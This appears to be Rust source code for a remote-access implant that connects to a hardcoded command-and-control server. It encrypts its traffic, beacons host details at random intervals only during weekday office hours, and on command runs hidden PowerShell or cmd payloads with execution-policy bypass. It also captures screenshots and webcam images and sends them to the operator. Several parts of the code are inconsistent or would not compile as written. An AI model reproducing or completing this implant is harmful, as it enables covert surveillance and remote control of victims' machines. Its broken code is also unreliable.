use std::net::TcpStream;
use std::io::{Read, Cursor};
use std::process::Command;
use std::fs::{File, create_dir};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::thread;
use std::sync::{Arc, Mutex};
use rand::Rng;
use screenshots::Screen;
use image::{ImageBuffer, Rgb};
use chrono::Local;
use sha2::{Sha256, Digest, Sha512};
use pbkdf2::pbkdf2_hmac;
use aes_gcm::{Aes256Gcm, Key, Nonce};
use base64::{encode, decode};
use sysinfo::{System, SystemExt};
use opencv::{core, highgui, imgcodecs, prelude::*, videoio};

// Constants
const CVER: &str = "0.2.0";
const TYPE: &str = "rust";
const CHUNK_SIZE: usize = 1024;
const SERVER_ADDRESS: &str = "10.0.0.29";
const SERVER_PORT: u16 = 54678;
const MAX_RETRIES: u32 = 5;
const RETRY_INTERVALS: [u64; 6] = [
    10_000,   // 10 seconds
    30_000,   // 30 seconds
    60_000,   // 1 minute
    120_000,  // 2 minutes
    240_000,  // 4 minutes
    360_000   // 6 minutes
];
const BEACON_MIN_INTERVAL: u64 = 5 * 60 * 1000; // 5 minutes
const BEACON_MAX_INTERVAL: u64 = 45 * 60 * 1000; // 45 minutes

// Global variables (using Arc<Mutex<>> for shared mutable state)
lazy_static! {
    static ref CLIENT: Arc<Mutex<Option<TcpStream>>> = Arc::new(Mutex::new(None));
    static ref BEACON_INTERVAL_INSTANCE: Arc<Mutex<Option<thread::JoinHandle<()>>>> = Arc::new(Mutex::new(None));
    static ref LOG_STREAM: Arc<Mutex<Option<File>>> = Arc::new(Mutex::new(None));
    static ref START_TIME: SystemTime = SystemTime::now();
    static ref EXIT_PROCESS: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
    static ref SESSION_ID: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
}

const LOGGING: bool = true;

fn log_it(message: &str) {
    if LOGGING {
        if let Some(mut file) = LOG_STREAM.lock().unwrap().as_mut() {
            let timestamp = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_secs();
            writeln!(file, "[{}] {}", timestamp, message).unwrap();
        }
    }
}

fn get_session_id(client: &TcpStream) -> Result<String, Box<dyn std::error::Error>> {
    let peer_addr = client.peer_addr()?;
    let ip_address = peer_addr.ip().to_string();
    log_it(&format!("IP Address: {}", ip_address));
    
    let sum: u32 = ip_address
        .split('.')
        .map(|octet| octet.parse::<u32>().unwrap_or(0))
        .sum();
    
    let mut hasher = Sha256::new();
    hasher.update(format!("{}<>{}", ip_address, sum));
    let result = hasher.finalize();
    let crypt = hex::encode(&result)[..32].to_string();
    
    log_it(&format!("Session ID: {}", crypt));
    Ok(crypt)
}

fn encrypt_data(data: &str, shared_key: &str) -> Result<String, Box<dyn std::error::Error>> {
    let mut salt = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut salt);
    
    let mut key = [0u8; 32];
    pbkdf2_hmac::<Sha512>(shared_key.as_bytes(), &salt, 200_000, &mut key);
    
    let mut iv = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut iv);
    
    let key = Key::from_slice(&key);
    let nonce = Nonce::from_slice(&iv);
    
    let cipher = Aes256Gcm::new(key);
    let ciphertext = cipher.encrypt(nonce, data.as_bytes())
        .map_err(|e| format!("Encryption failed: {:?}", e))?;
    
    let salt_b64 = base64::encode(salt);
    let iv_b64 = base64::encode(iv);
    let ciphertext_b64 = base64::encode(ciphertext);
    
    Ok(format!("{}:{}:{}", salt_b64, iv_b64, ciphertext_b64))
}

fn decrypt_data(encrypted: &str, shared_key: &str) -> Result<String, Box<dyn std::error::Error>> {
    let parts: Vec<&str> = encrypted.split(':').collect();
    if parts.len() != 3 {
        return Err("Invalid encrypted data format".into());
    }
    
    let salt = base64::decode(parts[0])?;
    let iv = base64::decode(parts[1])?;
    let ciphertext = base64::decode(parts[2])?;
    
    let mut key = [0u8; 32];
    pbkdf2_hmac::<Sha512>(shared_key.as_bytes(), &salt, 200_000, &mut key);
    
    let key = Key::from_slice(&key);
    let nonce = Nonce::from_slice(&iv);
    
    let cipher = Aes256Gcm::new(key);
    let plaintext = cipher.decrypt(nonce, ciphertext.as_ref())
        .map_err(|e| format!("Decryption failed: {:?}", e))?;
    
    Ok(String::from_utf8(plaintext)?)
}

fn get_retry_interval(retries: usize) -> u64 {
    RETRY_INTERVALS.get(retries).cloned().unwrap_or(0)
}

async fn send_command(response: serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let session_id = SESSION_ID.lock().unwrap().clone().ok_or("Session ID not set")?;
    let encrypted = encrypt_data(&serde_json::to_string(&response)?, &session_id)?;
    
    if encrypted.len() >= CHUNK_SIZE {
        let mut remaining = encrypted;
        while !remaining.is_empty() {
            let (chunk, rest) = remaining.split_at(std::cmp::min(CHUNK_SIZE, remaining.len()));
            let mut chunk = chunk.to_string();
            if rest.is_empty() {
                chunk += "--FIN--";
            }
            log_it(&format!("Sent Chunk: {}", chunk));
            CLIENT.lock().unwrap().as_mut().ok_or("Client not connected")?.write_all(chunk.as_bytes())?;
            remaining = rest.to_string();
        }
    } else {
        log_it(&format!("Sent Data: {}", encrypted));
        CLIENT.lock().unwrap().as_mut().ok_or("Client not connected")?.write_all(encrypted.as_bytes())?;
    }
    
    Ok(())
}

async fn send_beacon() -> Result<(), Box<dyn std::error::Error>> {
    let sys = System::new_all();
    let response = serde_json::json!({
        "response": {
            "beacon": true,
            "version": CVER,
            "type": TYPE,
            "platform": std::env::consts::OS,
            "arch": std::env::consts::ARCH,
            "osver": sys.os_version().unwrap_or_default(),
            "hostname": sys.host_name().unwrap_or_default()
        }
    });
    send_command(response).await
}

fn sleep(ms: u64) {
    thread::sleep(Duration::from_millis(ms));
}

fn utf8_to_16(s: &str) -> Vec<u16> {
    s.encode_utf16().collect()
}

fn format_file_name(name: &str, extension: &str) -> String {
    let now = chrono::Local::now();
    format!("{}_{}_{}.{}", 
        name,
        now.format("%Y-%m-%d"),
        now.format("%H-%M-%S"),
        extension.trim_start_matches('.')
    )
}

async fn run_webcam_clip() -> Result<(), Box<dyn std::error::Error>> {
    // Set the file name for saving the image
    let file_name = format_file_name("wc", "jpg");

    // Open the default camera (index 0)
    let mut camera = videoio::VideoCapture::new(0, videoio::CAP_ANY)?;

    // Check if the camera opened successfully
    if !camera.is_opened()? {
        return Err("Failed to open camera".into());
    }

    // Capture a single frame
    let mut frame = Mat::default();
    camera.read(&mut frame)?;

    // Check if the frame is empty
    if frame.empty()? {
        return Err("Failed to capture frame".into());
    }

    // Encode the frame as JPEG
    let mut buf = Vec::new();
    imgcodecs::imencode(".jpg", &frame, &mut buf, &core::Vector::new())?;

    // Convert the image buffer to base64
    let encoded_image = base64::encode(&buf);

    // Send the command (assuming send_command is defined elsewhere)
    send_command(serde_json::json!({
        "response": {
            "download": file_name,
            "data": encoded_image
        }
    })).await?;

    Ok(())
}

async fn run_screenshot() -> Result<(), Box<dyn std::error::Error>> {
    let file_name = format_file_name("ss", "jpg");
    
    let screen = screenshots::Screen::all()?[0];
    let image = screen.capture()?;
    let buffer = image.buffer();

    send_command(serde_json::json!({
        "response": {
            "download": file_name,
            "data": base64::encode(buffer)
        }
    })).await?;

    Ok(())
}

async fn run_command(command: &str, payload: &str, is_file: bool) -> Result<String, Box<dyn std::error::Error>> {
    let command = command.trim();
    if command.is_empty() {
        return Err("No command provided.".into());
    }
    if !["cmd", "ps"].contains(&command) {
        return Err("Unsupported command.".into());
    }

    let mut cmd = Command::new(if command == "cmd" { "cmd.exe" } else { "powershell.exe" });

    match command {
        "cmd" => {
            if payload.contains(';') || payload.contains('&') {
                return Err("Invalid characters in payload.".into());
            }
            cmd.args(&["/c", payload]);
        },
        "ps" => {
            cmd.args(&[
                "-NonInteractive",
                "-NoLogo",
                "-NoProfile",
                "-WindowStyle", "Hidden",
                "-ExecutionPolicy", "Bypass"
            ]);
            if is_file {
                cmd.arg("-File").arg(payload);
            } else {
                let encoded_cmd = base64::encode(&utf8_to_16(payload));
                cmd.args(&["-EncodedCommand", &encoded_cmd]);
            }
        },
        _ => unreachable!(),
    }

    let output = cmd.output().await?;
    if !output.status.success() {
        return Err(format!("Command failed with code {}. Error output: {}", 
                           output.status.code().unwrap_or(-1), 
                           String::from_utf8_lossy(&output.stderr)).into());
    }

    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

fn format_time(milliseconds: u64) -> String {
    let total_seconds = milliseconds / 1000;
    let days = total_seconds / 86400;
    let hours = (total_seconds % 86400) / 3600;
    let minutes = (total_seconds % 3600) / 60;
    let seconds = total_seconds % 60;
    format!("{}d {}h {}m {}s", days, hours, minutes, seconds)
}

async fn get_uptime() -> Result<(), Box<dyn std::error::Error>> {
    let start = *START_TIME.lock().unwrap();
    let uptime = SystemTime::now().duration_since(start)?;
    let formatted_uptime = format_time(uptime.as_millis() as u64);
    
    send_command(serde_json::json!({
        "response": {
            "data": formatted_uptime
        }
    })).await?;

    Ok(())
}

async fn parse_action(action: &str) -> Result<(), Box<dyn std::error::Error>> {
    let parts: Vec<&str> = action.trim().split_whitespace().collect();
    if parts.is_empty() {
        return Err("No action provided".into());
    }

    let command = parts[0];
    let properties = &parts[1..];

    match command {
        "ps" | "cmd" => {
            if properties.is_empty() {
                return Err("No payload provided".into());
            }
            let payload = String::from_utf8(base64::decode(properties[0])?)?;
            let result = run_command(command, &payload, false).await?;
            send_command(serde_json::json!({"response": {"data": result}})).await?;
        },
        "up" => {
            get_uptime().await?;
        },
        "di" => {
            *EXIT_PROCESS.lock().unwrap() = true;
            std::process::exit(0);
        },
        "ss" => {
            run_screenshot().await?;
        },
        "wc" => {
            run_webcam_clip().await?;
        },
        _ => return Err(format!("Unknown command: {}", command).into()),
    }

    Ok(())
}

fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
    let mut retry_count = 0;

    loop {
        match TcpStream::connect((SERVER_ADDRESS, SERVER_PORT)) {
            Ok(mut stream) => {
                log_it("Client connected");
                *CLIENT.lock().unwrap() = Some(stream.try_clone()?);

                let session_id = get_session_id(&CLIENT.lock().unwrap().as_ref().unwrap())?;
                *SESSION_ID.lock().unwrap() = Some(session_id);

                send_beacon()?;

                let beacon_interval = rand::thread_rng().gen_range(BEACON_MIN_INTERVAL..=BEACON_MAX_INTERVAL);
                let start_time = Instant::now();

                loop {
                    if start_time.elapsed().as_millis() >= beacon_interval as u128 {
                        let now = Local::now();
                        if now.weekday().num_days_from_monday() < 5 && (7..=19).contains(&now.hour()) {
                            send_beacon()?;
                        }
                        break;
                    }

                    let mut buffer = [0; 1024];
                    match stream.read(&mut buffer) {
                        Ok(0) => {
                            log_it("Connection closed by server");
                            break;
                        }
                        Ok(n) => {
                            let data = String::from_utf8_lossy(&buffer[..n]);
                            log_it(&format!("Received data: {}", data));
                            let session_id = SESSION_ID.lock().unwrap().clone().unwrap();
                            let decrypted = decrypt_data(&data, &session_id)?;
                            parse_action(&decrypted)?;
                        }
                        Err(e) => {
                            log_it(&format!("Error reading from socket: {}", e));
                            break;
                        }
                    }
                }

                if *EXIT_PROCESS.lock().unwrap() {
                    return Ok(());
                }
            }
            Err(e) => {
                log_it(&format!("Failed to connect: {}", e));
                if retry_count >= MAX_RETRIES {
                    log_it("Max retries reached. Exiting.");
                    thread::sleep(Duration::from_millis(BEACON_MAX_INTERVAL * 8));
                    return Ok(());
                }
                let retry_interval = get_retry_interval(retry_count as usize);
                log_it(&format!("Retrying in {} seconds...", retry_interval / 1000));
                thread::sleep(Duration::from_millis(retry_interval));
                retry_count += 1;
            }
        }
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    if LOGGING {
        let logs_dir = Path::new("logs");
        if !logs_dir.exists() {
            create_dir(logs_dir)?;
        }
        let log_file = logs_dir.join("client.log");
        *LOG_STREAM.lock().unwrap() = Some(File::create(log_file)?);
    }

    connect_to_server()
}